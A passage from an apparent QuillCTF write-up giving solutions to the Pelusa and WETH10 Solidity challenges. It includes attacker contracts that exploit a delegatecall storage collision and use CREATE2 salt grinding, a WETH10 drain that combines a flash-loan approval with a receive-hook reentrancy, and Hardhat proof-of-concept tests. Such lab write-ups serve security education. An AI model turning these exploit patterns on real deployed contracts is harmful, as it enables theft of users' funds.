contract PelusaAttacker is IGame {
  address public owner;
  uint256 goals;

  constructor(address owner_, address target_) {
    owner = owner_; // read from private storage of target
    Pelusa(target_).passTheBall(); // become the player
  }

  function getBallPossesion() external view override returns (address) {
    return owner;
  }

  function handOfGod() external returns (uint256) {
    goals = 2; // wins via delegatecall storage collision
    return 22_06_1986;
  }
}
```

The contract implementation is rather straightforward: call `passTheBall` during construction phase and then you will become the player. Below is the contract to deploy the one above:

```solidity
contract PelusaAttackerDeployer {
  address public deployment;
  address immutable target;

  constructor(address target_) {
    target = target_;
  }

  // will check the address requirement and create the contract with Create2
  function deployAttacker(address _owner, bytes32 _salt) external {
    address addr = address(new PelusaAttacker{salt: _salt}(_owner, target));
    require(uint256(uint160(addr)) % 100 == 10, "bad address");
    deployment = addr;
  }
}
```

This deployer will take a salt parameter given by us, but it will also make sure it matched the requirement, to save gas in case it is wrong. Once it is successful, we can read the deployed address via the public `deployment` variable.

Below is the Hardhat code to execute the attack:

```ts
describe("QuillCTF 8: Pelusa", () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Pelusa;
  let attackerDeployer: PelusaAttackerDeployer;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("Pelusa", owner)
      .then((f) => f.deploy());
    await contract.deployed();

    expect(await contract.goals()).to.eq(1);
  });

  it("should score a goal", async () => {
    // should deploy
    attackerDeployer = await ethers
      .getContractFactory("PelusaAttackerDeployer", attacker)
      .then((f) => f.deploy(contract.address));
    await attackerDeployer.deployed();

    // immutables are stored directly within bytecode, rather than storage
    // we have to parse it from the bytecode
    // address can be found by analyzing the code at evm.codes/playground
    // or you can parse as follows
    const code = await ethers.provider.getCode(contract.address);
    const index = code.indexOf("7f000000000000000000000000"); // PUSH32 followed by 12byte zeros
    const pushLine = code.slice(index, index + 66);
    const ownerAddress = "0x" + pushLine.slice(26);
    expect(ownerAddress).to.be.properAddress;

    // randomly find the salt
    for (let i = 0; i < 2500; i++) {
      const s = ethers.utils.randomBytes(32);
      try {
        await attackerDeployer
          .connect(attacker)
          .deployAttacker(ownerAddress, s);
        // console.log('Attempt:', i, '\tSalt:', Buffer.from(s).toString('hex'));
        break;
        // eslint-disable-next-line no-empty
      } catch (err) {}
    }
    // ensure deployment went right
    expect(await attackerDeployer.deployment()).to.not.eq(
      ethers.constants.AddressZero,
    );

    // score the goal!
    await contract.connect(attacker).shoot();
  });

  after(async () => {
    expect(await contract.goals()).to.eq(2);
  });
});
```

## 9. WETH10

> Tired of WETH9, we created an overall better version of the commonly used contract, providing a trustless, immutable, and standardized way for smart contracts to abstract away the difference between the native ETH asset and fungible ERC-20 tokens.
>
> We call it WETH10, the Messi Wrapped Ether.
>
> The contract currently has 10 ethers.

**Objective of CTF:**

- Your job is to rescue all the funds from the contract, starting with 1 ether, in only one transaction.

**Target contract:**

```solidity
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Messi Wrapped Ether
contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
  receive() external payable {
    deposit();
  }

  function _burnAll() internal {
    _burn(msg.sender, balanceOf(msg.sender));
  }

  function deposit() public payable nonReentrant {
    _mint(msg.sender, msg.value);
  }

  function withdraw(uint256 wad) external nonReentrant {
    Address.sendValue(payable(msg.sender), wad);
    _burn(msg.sender, wad);
  }

  function withdrawAll() external nonReentrant {
    Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
    _burnAll();
  }

  /// @notice Request a flash loan in ETH
  function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
    uint256 prevBalance = address(this).balance;
    Address.functionCallWithValue(receiver, data, amount);

    require(address(this).balance >= prevBalance, "flash loan not returned");
  }
}
```

### The Attack

In this challenge, it first feels like we should do something with the flash loan. However, most of the functions are re-entrancy guarded, so we can't really get into them from within the loan. However, the loan logic itself allows us to call anything!

So, first we can have infinite allowance by making the contract itself call `approve` from within the loan, approving us a lot of tokens.

The real trick is in the second one, which is related to actually draining the funds. Let us examine the withdraw functions:

- `withdraw` takes an amount, and sends it as value to the caller, and burns that same amount from the WETH10.
- `withdrawAll` seems like it is doing a `withdraw(<your-balance>)` but it is not! At the burning step, it just burns your remaining token balance at that point! So, if you could somehow secure your tokens elsewhere right after receiving your withdrawals, but right before the burning takes place; then, you can retrieve those tokens later to keep withdrawing!

That is exactly what we will do. We first start with 1 ETH, so we can draw 1 ETH for free. Then, we can draw 2 ETH, and then 4 ETH and so on, until we drain the contract.

### Proof of Concept

Our attacker contract, acting as Bob here, is written as follows:

```solidity
contract WETH10Attacker {
  WETH10 immutable weth10;
  address immutable target;
  address immutable bob;

  bool ispwning;

  constructor(address targetAddress) {
    weth10 = WETH10(payable(targetAddress));
    bob = address(this);
    target = targetAddress;
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a < b) {
      return a;
    }
    return b;
  }

  function pwn() external {
    // take 0-amount flash loan, approving many many tokens to the user
    weth10.execute(target, 0, abi.encodeWithSignature("approve(address,uint256)", [uint256(uint160(bob)), 9999 ether]));

    while (target.balance != 0) {
      // commence attack with min(yourBalance, targetBalance)
      uint256 amount = min(bob.balance, target.balance);

      // deposit WETH
      weth10.deposit{value: amount}();

      // withdraw WETH, will enter `receive`
      ispwning = true;
      weth10.withdrawAll();
      ispwning = false;

      // transferFrom back your WETH10
      weth10.transferFrom(target, bob, amount);

      // withdraw for real to get extra ETH for your WETH10
      weth10.withdrawAll();
    }
  }

  receive() external payable {
    if (ispwning) {
      // send WETH10 back to the pool, before burning happens
      weth10.transfer(target, msg.value);
    }
  }
}
```

A Hardhat proof-of-concept test is written as follows (in compliance with the setup described in Foundry):

```ts
describe("QuillCTF: 9. WETH10", () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: WETH10;
  let bob: WETH10Attacker;

  const CONTRACT_INITIAL_BALANCE = ethers.utils.parseEther("10");
  const BOB_INITIAL_BALANCE = ethers.utils.parseEther("1");

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("WETH10", owner)
      .then((f) => f.deploy());
    await contract.deployed();

    // weth contract should have 10 ether
    await ethers.provider.send("hardhat_setBalance", [
      contract.address,
      "0x8ac7230489e80000",
    ]);
    expect(await ethers.provider.getBalance(contract.address)).to.eq(
      CONTRACT_INITIAL_BALANCE,
    );
  });

  it("should rescue funds", async () => {
    bob = await ethers
      .getContractFactory("WETH10Attacker", attacker)
      .then((f) => f.deploy(contract.address));
    await bob.deployed();

    // bob should have 1 ether
    await ethers.provider.send("hardhat_setBalance", [
      bob.address,
      "0xde0b6b3a7640000",
    ]);
    expect(await ethers.provider.getBalance(bob.address)).to.eq(
      BOB_INITIAL_BALANCE,
    );

    // pwn
    await bob.pwn();
  });

  after(async () => {
    // empty weth contract
    expect(await ethers.provider.getBalance(contract.address)).to.eq(0);

    // bob balance should be 11 ETH
    expect(await ethers.provider.getBalance(bob.address)).to.eq(
      ethers.utils.parseEther("11"),
    );
  });
});
```
